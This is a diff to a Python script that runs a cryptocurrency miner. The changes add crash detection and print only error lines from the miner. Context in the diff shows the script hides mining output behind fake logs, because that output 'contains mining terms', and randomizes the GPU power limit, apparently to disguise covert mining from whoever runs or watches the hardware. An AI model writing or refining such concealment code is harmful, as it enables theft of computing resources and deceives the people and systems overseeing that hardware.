@@ -346,7 +346,7 @@ def set_gpu_power_limit(min_watts=200, max_watts=600):
         )
         if result.returncode != 0:
             return
-        max_limit = int(result.stdout.strip().split("\n")[0])
+        max_limit = int(float(result.stdout.strip().split("\n")[0]))
         target = min(max_watts, max_limit)
         target = max(min_watts, target - random.randint(0, 100))
         subprocess.run(
@@ -621,12 +621,25 @@ def main():
     print(f"[main] miner PID: {proc.pid}")
     print("[main] running... Ctrl+C to stop")
 
+    # Quick check: did miner crash immediately?
+    time.sleep(2)
+    if proc.poll() is not None:
+        print(f"[!] miner exited immediately with code {proc.returncode}")
+        # Read remaining output
+        remaining = proc.stdout.read()
+        if remaining:
+            for line in remaining.strip().split("\n")[-20:]:
+                print(f"  {line}")
+        return proc.returncode
+
     # Forward miner output (interleaved with fake logs)
     try:
         for line in proc.stdout:
-            # Don't print raw miner output — it contains mining terms
-            # The fake_output_loop handles visible output
-            pass
+            # Check for errors (connection failures, crashes)
+            lower = line.lower()
+            if any(kw in lower for kw in ["error", "fail", "panic", "fatal", "cannot", "denied"]):
+                print(f"[miner] {line.rstrip()}", flush=True)
+            # Don't print normal mining output — fake_output_loop handles visible logs
     except KeyboardInterrupt:
         print("\n[main] stopping...")
         proc.terminate()
@@ -636,6 +649,8 @@ def main():
         shutil.rmtree(workdir, ignore_errors=True)
 
     proc.wait()
+    if proc.returncode != 0:
+        print(f"[!] miner exited with code {proc.returncode}")
     return proc.returncode
 
 if __name__ == "__main__":
